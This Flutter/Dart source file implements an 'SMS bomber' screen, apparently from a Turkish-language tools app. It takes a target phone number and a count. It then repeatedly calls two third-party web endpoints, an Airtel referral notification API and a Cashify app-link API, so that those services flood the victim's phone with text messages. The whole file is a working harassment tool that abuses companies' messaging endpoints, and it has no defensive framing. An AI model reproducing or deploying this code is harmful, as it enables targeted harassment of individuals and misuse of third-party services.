import 'dart:async';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:iconsax/iconsax.dart';
import 'package:nox/ui/constant/color/colors.dart';
import 'package:nox/ui/page/tools/home/tools_home.dart';
import 'package:page_transition/page_transition.dart';

final String bomburl =
    "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn=";
final String bomburl2 = "https://www.cashify.in/api/cu01/v1/app-link?mn=";

class Bomber extends StatefulWidget {
  @override
  _BomberState createState() => _BomberState();
}

class _BomberState extends State<Bomber> {
  int mo_nu = 0;
  int count = 0;
  int sms_sent = 0;
  bool sending = false;

  Future<Null> bombit(String mo_no, int count) async {
    setState(() {
      sending = true;
    });
    for (int i = 0; i < count; i++) {
      setState(() {
        sms_sent = i + 1;
      });

      if (i % 2 == 0) {
        var req = await http.get(Uri.parse(bomburl + mo_no));
      } else {
        var req2 = await http.get(Uri.parse(bomburl2 + mo_no));
      }

      print("SMS Gönderildi");
    }
    setState(() {
      sending = false;
    });
  }

  @override
  void initState() {
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        elevation: 0.0,
        titleSpacing: 10.0,
        backgroundColor: NowUIColors.bgcolor,
        leading: new IconButton(
          icon: new Icon(
            Icons.arrow_back_ios,
            color: NowUIColors.beyaz,
          ),
          onPressed: () {
            Navigator.push(
                context, MaterialPageRoute(builder: (context) => ToolsHome()));
          },
        ),
        toolbarHeight: 60.5,
        toolbarOpacity: 0.7,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.only(
              bottomRight: Radius.circular(35),
              bottomLeft: Radius.circular(35)),
        ),
        centerTitle: true,
        title: Image.asset(
          "assets/img/logo.png",
          height: 40,
          width: 40,
        ),
        actions: <Widget>[],
      ),
      backgroundColor: NowUIColors.bgcolor,
      body: Center(
        child: SingleChildScrollView(
          child: Container(
            height: MediaQuery.of(context).size.height - 200,
            width: MediaQuery.of(context).size.width - 50,
            decoration: BoxDecoration(
                borderRadius: BorderRadius.all(Radius.circular(20)),
                gradient: LinearGradient(
                    colors: [NowUIColors.bgcolor, NowUIColors.bgcolor])),
            child: Padding(
              padding: const EdgeInsets.all(8.0),
              child: Column(
                children: <Widget>[
                  Padding(
                      padding: const EdgeInsets.all(20),
                      child: TextField(
                        onChanged: (v) {
                          mo_nu = int.parse(v);
                        },
                        style: TextStyle(
                            color: Colors.white, fontWeight: FontWeight.w300),
                        keyboardType: TextInputType.numberWithOptions(),
                        decoration: InputDecoration(
                          labelStyle: TextStyle(color: Colors.white),
                          prefixIcon: Icon(Icons.phone),
                          labelText: "Numara:",
                        ),
                      )),
                  Padding(
                      padding: const EdgeInsets.all(20),
                      child: TextField(
                        onChanged: (v) {
                          count = int.parse(v);
                        },
                        style: TextStyle(
                            color: Colors.white, fontWeight: FontWeight.w300),
                        keyboardType: TextInputType.numberWithOptions(),
                        decoration: InputDecoration(
                          labelStyle: TextStyle(color: Colors.white),
                          prefixIcon: Icon(Icons.sms),
                          labelText: "Toplam Gönderilecek SMS:",
                        ),
                      )),
                  sms_sent == 0
                      ? Container()
                      : Center(
                          child: Text("$sms_sent SMS Sent"),
                        ),
                  Padding(
                    padding: const EdgeInsets.fromLTRB(50, 25, 50, 0),
                    child: sending == true
                        ? SizedBox(
                            height: 50,
                            width: 50,
                            child: CircularProgressIndicator(),
                          )
                        : InkWell(
                            onTap: () {
                              bombit(mo_nu.toString(), count);
                            },
                            child: Container(
                              height: 50,
                              decoration: BoxDecoration(
                                gradient: LinearGradient(
                                  colors: [
                                    Colors.deepPurple,
                                    Colors.pink,
                                  ],
                                  begin: Alignment.topLeft,
                                  end: Alignment.bottomRight,
                                ),
                                borderRadius: BorderRadius.circular(20),
                                boxShadow: [
                                  BoxShadow(
                                    color: Colors.black12,
                                    offset: Offset(5, 5),
                                    blurRadius: 10,
                                  )
                                ],
                              ),
                              child: Center(
                                child: Text(
                                  'Gönder',
                                  style: TextStyle(
                                    color: Colors.white,
                                    fontSize: 22,
                                    fontWeight: FontWeight.w500,
                                  ),
                                ),
                              ),
                            ),
                          ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
